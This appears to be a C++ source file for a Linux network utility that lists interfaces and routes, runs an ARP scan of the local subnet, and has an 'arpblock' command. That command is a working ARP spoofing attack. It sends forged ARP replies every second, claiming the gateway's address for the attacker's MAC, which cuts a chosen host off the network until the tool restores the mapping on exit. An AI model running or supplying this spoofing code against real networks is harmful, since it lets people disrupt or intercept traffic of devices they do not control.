#include <iostream>
#include <string>
#include <chrono>
#include <thread>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <netinet/ether.h>
#include <memory.h>
#include <signal.h>

#include "netinfomanager.h"
#include "l2/arp.h"

using namespace pol4b;
using namespace std;

void print_usage(string name);
bool is_root();
int show_interfaces();
int show_routes();
int arpscan(string interface);
int arpblock(string ip);

int main(int argc, char *argv[]) {
  string command = "";
  int result = 0;
  if (argc < 2)
    goto exit_err;
  command = argv[1];
  if (command == "interfaces") {
    result = show_interfaces();
  }
  else if (command == "routes") {
    result = show_routes();
  }
  else if (command == "arpscan" && argc >= 3) {
    result = !is_root();
    if (result == 0)
      result = arpscan(argv[2]);
  }
  else if (command == "arpblock" && argc >= 3) {
    result = !is_root();
    if (result == 0)
      result = arpblock(argv[2]);
  }
  else {
    goto exit_err;
  }
  return result;

exit_err:
  print_usage(argv[0]);
  return 1;
}

void print_usage(string name) {
  cout << "Usage : " << name << " <command>" << endl;
  cout << "  interfaces\t\tPrint network interface list" << endl;
  cout << "  routes\t\tPrint routing table" << endl;
  cout << "  arpscan <interface>\tScan devices in same network with <interface>" << endl;
  cout << "  arpblock <ip>\t\tBlock network connection of <ip>" << endl << endl;
  cout << "You will need ROOT privileges to run ARP related commmands." << endl;
}

bool is_root() {
  bool result = geteuid() == 0;
  if (!result)
    cerr << "You need ROOT privileges to run this command." << endl;
  return result;
}

int show_interfaces() {
  const unordered_map<string, NetInfo> *netinfos = nullptr;
  try {
    netinfos = &NetInfoManager::instance().get_all_netinfo();
  }
  catch (const exception &e) {
    cerr << e.what() << endl;
    return 1;
  }
  for (auto &netinfo : *netinfos) {
    auto gateway_ip = NetInfoManager::instance().get_gateway_ip(netinfo.first);
    cout << netinfo.first << " : " << (string)netinfo.second.mac << ", " <<
      (string)netinfo.second.ip << "/" << netinfo.second.mask.to_cidr();
    if (gateway_ip)
      cout << ", " << (string)*gateway_ip;
    cout << endl;
  }
  return 0;
}

int show_routes() {
  const unordered_map<string, vector<RouteInfo>> *routes = nullptr;
  try {
    routes = &NetInfoManager::instance().get_all_routeinfo();
  }
  catch(const exception &e) {
    cerr << e.what() << endl;
    return 1;
  }
  for (auto &ifroute : *routes) {
    for (auto &route : ifroute.second) {
      cout << ifroute.first << " : " << (string)route.destination << "/" << route.mask.to_cidr() <<
        ", " << (string)route.gateway << ", " << route.metric << endl;
    }
  }
  return 0;
}

int arpscan(string interface) {
    pair<IPv4Addr, IPv4Addr> ip_range;
    try {
        ip_range = NetInfoManager::instance().get_ip_range(interface);
    }
    catch (const exception &e) {
        cerr << e.what() << endl;
        return 1;
    }
    list<IPv4Addr> ip_list;
    for (auto ip = ip_range.first; ip <= ip_range.second; ip++)
        ip_list.push_back(ip);
    bool scan_finished = false;
    auto callback = [&](IPv4Addr ip, MACAddr mac) {
        if (ip == 0) {
            scan_finished = true;
            return;
        }
        cout << (string)ip << " " << (string)mac << endl;
    };
    ARP::get_mac_addr(ip_list, callback);
    while (!scan_finished) {
        cout << "Waiting" << endl;
        this_thread::sleep_for(chrono::milliseconds(50)); // Avoid busy-wait
    }
    return 0;
}

int sock = 0;
int stop = false;
int if_index = 0;
ARP *recover = nullptr;
int arpblock(string ip) {
  IPv4Addr target_ip;
  // Validate IP address.
  try {
    target_ip = IPv4Addr(ip);
  }
  catch (const exception &e) {
    cerr << e.what() << endl;
    return 1;
  }

  // Signal handler for send recover packet on exit.
  auto signal_handler = +[](int signum) {
    if (sock <= 0 || recover == nullptr)
      return;
    cout << "Caught signal " << signum << ", sending recover packets..." << endl;
    sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = if_index;
    memcpy(sa.sll_addr, &recover->eth_hdr.source_mac, ETH_ALEN);
    stop = true;
    for (int i = 0; i < 10; i++) {
      if (sendto(sock, recover, sizeof(*recover), 0, (sockaddr*)&sa, sizeof(sa)) < 0)
        break;
      this_thread::sleep_for(chrono::seconds(1));
    }
  };
  // Register signal handler.
  signal(SIGINT, signal_handler);
  signal(SIGTERM, signal_handler);

  // Get interface info.
  auto route_info = NetInfoManager::instance().get_best_routeinfo(target_ip);
  if (route_info.first.empty()) {
    cerr << "No route to target." << endl;
    return 1;
  }
  auto netinfo = NetInfoManager::instance().get_netinfo(route_info.first);
  if (netinfo == nullptr) {
    cerr << "Failed to get interface info." << endl;
    return 1;
  }
  if_index = NetInfoManager::instance().get_interface_index(route_info.first);
  if (if_index == -1) {
    cerr << "Failed to get interface index." << endl;
    return 1;
  }

  // Setup target and gateway information.
  MACAddr target_mac = ARP::get_mac_addr(target_ip);
  const IPv4Addr *gateway_ip = NetInfoManager::instance().get_gateway_ip(route_info.first);
  if (gateway_ip == nullptr) {
    cerr << "Failed to get IP address of the gateway." << endl;
    return 1;
  } IPv4Addr fake_ip = *gateway_ip; // Generate and bind raw socket.
  sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  if (sock < 0) {
    cerr << "Failed to create socket." << endl;
    return 1;
  }
  sockaddr_ll sa;
  memset(&sa, 0, sizeof(sa));
  sa.sll_family = AF_PACKET;
  sa.sll_protocol = htons(ETH_P_ARP);
  sa.sll_ifindex = if_index;
  if (::bind(sock, (sockaddr*)&sa, sizeof(sa)) < 0) {
    close(sock);
    cerr << "Failed to bind socket." << endl;
    return 1;
  }

  ARP fake_reply = ARP::make_packet(netinfo->mac, target_mac, ARPHeader::Operation::Reply,
    netinfo->mac, fake_ip, target_mac, target_ip);

  MACAddr gateway_mac = ARP::get_mac_addr(*gateway_ip);
  if (gateway_mac == 0) {
    cerr << "Failed to get MAC address of the gateway." << endl;
    return 1;
  }


  // Generate ARP fake reply and recover packet.
  recover = new ARP();
  *recover = ARP::make_packet(gateway_mac, target_mac, ARPHeader::Operation::Reply,
    gateway_mac, *gateway_ip, target_mac, target_ip);

  // Send ARP fake reply packet.
  while(!stop) {
    if (send(sock, &fake_reply, sizeof(fake_reply), 0) < 0)
      break;
    this_thread::sleep_for(chrono::seconds(1));
  }

  close(sock);

  return 0;
}
